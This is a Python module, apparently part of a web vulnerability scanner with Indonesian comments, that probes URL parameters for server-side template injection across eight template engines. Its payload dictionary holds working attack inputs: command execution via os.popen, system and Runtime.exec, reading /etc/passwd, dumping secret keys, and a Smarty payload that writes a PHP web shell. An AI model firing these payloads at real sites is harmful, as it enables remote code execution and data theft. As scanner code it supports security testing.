import requests
import random

# Server-Side Template Injection payloads untuk berbagai template engines
SSTI_PAYLOADS = {
    "jinja2": [
        "{{7*7}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    "twig": [
        "{{7*7}}",
        "{{_self.env.display('test')}}",
        "{{['id']|filter('system')}}",
    ],
    "freemarker": [
        "${7*7}",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    ],
    "velocity": [
        "#set($x=7*7)$x",
        "#set($str=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))",
    ],
    "smarty": [
        "{7*7}",
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php eval($_GET[cmd]); ?>',self::clearConfig())}",
    ],
    "erb": [
        "<%= 7*7 %>",
        "<%= system('id') %>",
        "<%= File.open('/etc/passwd').read %>",
    ],
    "django": [
        "{{7*7}}",
        "{% debug %}",
        "{{settings.SECRET_KEY}}",
    ],
    "tornado": [
        "{{7*7}}",
        "{% import os %}{{os.system('id')}}",
    ],
}

# Expected results untuk detection
SSTI_RESULTS = {
    "{{7*7}}": "49",
    "${7*7}": "49",
    "{7*7}": "49",
    "#set($x=7*7)$x": "49",
    "<%= 7*7 %>": "49",
}

def test_ssti(url, params):
    """Test Server-Side Template Injection."""
    results = []
    
    for param in params:
        # Test basic math operations untuk detection
        for engine, payloads in SSTI_PAYLOADS.items():
            for payload in payloads[:2]:  # Test first 2 payloads per engine
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    response = requests.get(url, params=test_params, timeout=10, verify=False)
                    body = response.text
                    
                    # Check if payload executed
                    expected = SSTI_RESULTS.get(payload)
                    if expected and expected in body:
                        results.append({
                            "type": "Server-Side Template Injection (SSTI)",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": payload,
                            "detail": f"Template engine: {engine.upper()} - Payload executed (result: {expected})"
                        })
                        return results
                    
                    # Check for template errors
                    template_errors = [
                        "template", "jinja", "twig", "freemarker", "velocity",
                        "smarty", "erb", "django", "tornado", "syntax error",
                        "unexpected token", "template syntax"
                    ]
                    
                    body_lower = body.lower()
                    for error in template_errors:
                        if error in body_lower and len(body) > 100:
                            results.append({
                                "type": "Possible SSTI (Error-based)",
                                "severity": "HIGH",
                                "param": param,
                                "payload": payload,
                                "detail": f"Template error detected: '{error}' - Engine: {engine}"
                            })
                            # Continue testing other engines
                            break
                    
                    # Check for config/debug info exposure
                    sensitive_info = ["secret_key", "password", "api_key", "database", "config"]
                    if any(info in body_lower for info in sensitive_info):
                        if payload in ["{{config.items()}}", "{% debug %}", "{{settings.SECRET_KEY}}"]:
                            results.append({
                                "type": "SSTI Information Disclosure",
                                "severity": "CRITICAL",
                                "param": param,
                                "payload": payload,
                                "detail": f"Sensitive configuration exposed via {engine}"
                            })
                            return results
                    
                except requests.RequestException:
                    pass
        
        # Test with unique marker untuk blind SSTI
        unique_marker = str(random.randint(100000, 999999))
        blind_payloads = [
            f"{{{{'{unique_marker}'}}}}",
            f"${{{unique_marker}}}",
            f"<%= '{unique_marker}' %>",
        ]
        
        for payload in blind_payloads:
            test_params = params.copy()
            test_params[param] = payload
            
            try:
                response = requests.get(url, params=test_params, timeout=10, verify=False)
                if unique_marker in response.text:
                    results.append({
                        "type": "Possible SSTI (Blind)",
                        "severity": "HIGH",
                        "param": param,
                        "payload": payload,
                        "detail": f"Unique marker reflected - possible template processing"
                    })
                    break
            except:
                pass
    
    return results
